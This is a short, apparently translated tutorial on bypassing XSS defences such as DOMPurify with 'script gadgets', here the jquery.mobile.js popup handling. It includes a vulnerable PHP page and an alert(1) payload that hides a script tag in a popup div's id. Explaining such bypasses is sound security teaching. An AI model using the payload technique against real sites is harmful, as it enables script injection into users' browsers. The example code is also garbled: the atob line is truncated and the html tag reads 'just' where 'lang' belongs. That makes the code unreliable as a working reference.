Bypass Via Script Gadgets
================================

Introduction
--------------------------------
Some websites use whitelists or some DOM-based defense methods. For these methods, there is an attack method called "Code Reuse" that can be bypassed. This method is similar to Gadget in binary offense and defense, using legitimate code in the target to bypass defense measures. There is a specific description of this method in the paper ``Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets`.

A blog post by portswigger also expressed similar ideas ``https://portswigger.net/blog/abusing-javascript-frameworks-to-bypass-xss-mitigations``.

Here is a simple example. This example uses ``DOMPurify`` to reinforce, but it can be attacked because of the introduction of ``jquery.mobile.js``.

example
--------------------------------
::

// index.php
<?php

$msg = $_GET['message'];
$msg = str_replace("
", "", $msg);
$msg = base64_encode($msg);

?>

<!DOCTYPE html>
<html just= "en">
<head>
<meta charset="UTF-8">
<title>Preview</title>
<script type="text/javascript" src="purify.js"></script>
<script type="text/javascript" src="jquery.js"></script>
<script type="text/javascript" src="jquery.mobile.js"></script>
</head>
<body>

<script type="text/javascript">
var d= atob(<
var cleanvar = DOMPurify.sanitize(d);
document.write(cleanvar);
</script>

</body>
</html>


::

// payload
<div data-role=popup id='-->
<script>alert(1)</script>'>
</div>
